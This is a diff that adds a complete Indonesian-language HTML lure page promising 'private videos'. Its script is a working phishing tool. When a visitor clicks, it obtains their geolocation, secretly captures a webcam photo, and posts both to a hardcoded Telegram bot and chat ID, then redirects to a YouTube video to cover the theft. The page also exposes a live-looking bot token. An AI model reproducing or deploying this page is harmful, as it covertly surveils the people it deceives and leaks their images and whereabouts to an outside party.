@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+              <img src="https://i.ibb.co/Chq31Dd/o8-Adn-Jaf-Wyid-BIAx-BVBLXwi-YABjpw-B2-Eh-NGAIX-tplv-nhvfeczskr-1-250-0.webp" alt="Icon" width="100" height="100">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VideoPrivate - SanzXChan</title>
+    <style>
+    img {
+      border-radius: 50%;
+      position: flex;
+    }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, green, blue, green);
+            background-size: 400% 400%;
+            animation: gradientAnimation 10s ease infinite;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .container {
+            background-color:gray;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        button {
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        button img {
+            margin-right: 10px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        video {
+            display: none;
+        }
+        b {
+          color: pink;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Kumpulan video ku</h1>
+        <p id="info">Klik tombol di bawah untuk lihat video private🤫</p>
+        <b>🌷SanzXChan💦</b>
+        <center>
+        <button onclick="handleClick()">
+            Klik
+        </button>
+        </center>
+        <video id="video" width="320" height="240" autoplay></video>
+    </div>
+
+    <script>
+        async function handleClick() {
+            await getLocationAndStartCamera();
+            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Link ke video YouTube
+        }
+
+        function getLocationAndStartCamera() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (position) => {
+                        await startCamera(position);
+                        resolve();
+                    }, showError);
+                } else {
+                    console.log("Geolocation tidak didukung oleh browser ini.");
+                    reject();
+                }
+            });
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    console.log("Pengguna menolak permintaan Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    console.log("Informasi lokasi tidak tersedia.");
+                    break;
+                case error.TIMEOUT:
+                    console.log("Permintaan lokasi melebihi batas waktu.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    console.log("Terjadi kesalahan yang tidak diketahui.");
+                    break;
+            }
+        }
+
+        function startCamera(position) {
+            return new Promise((resolve, reject) => {
+                const video = document.getElementById('video');
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(async () => {
+                                await capturePhotoAndSend(position);
+                                resolve();
+                            }, 2000); // Capture photo after 2 seconds
+                        };
+                    })
+                    .catch(error => {
+                        console.log("Terjadi kesalahan saat mengakses kamera.");
+                        reject();
+                    });
+            });
+        }
+
+        function capturePhotoAndSend(position) {
+            return new Promise((resolve, reject) => {
+                const video = document.getElementById('video');
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photo = canvas.toDataURL('image/png');
+
+                sendLocationAndPhotoToTelegram(position, photo).then(resolve).catch(reject);
+            });
+        }
+
+        function sendLocationAndPhotoToTelegram(position, photo) {
+            return new Promise((resolve, reject) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                const telegramBotToken = '7371764330:AAEgSgROcGBEbsgspY4IDNU_WqPL_3IczGs';
+                const chatId = '6864784021';
+                const locationMessage = `Lokasi Anda: https://www.google.com/maps?q=${latitude},${longitude}`;
+                
+                fetch(photo)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('caption', locationMessage);
+                        formData.append('photo', blob, 'photo.png');
+
+                        return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            console.log("Lokasi dan foto berhasil dikirim ke Telegram.");
+                            resolve();
+                        } else {
+                            console.log("Terjadi kesalahan saat mengirim lokasi dan foto.");
+                            console.log(data);
+                            reject();
+                        }
+                    })
+                    .catch(error => {
+                        console.log("Terjadi kesalahan saat mengirim lokasi dan foto.");
+                        console.log(error);
+                        reject();
+                    });
+            });
+        }
+    </script>
+</body>
+</html>
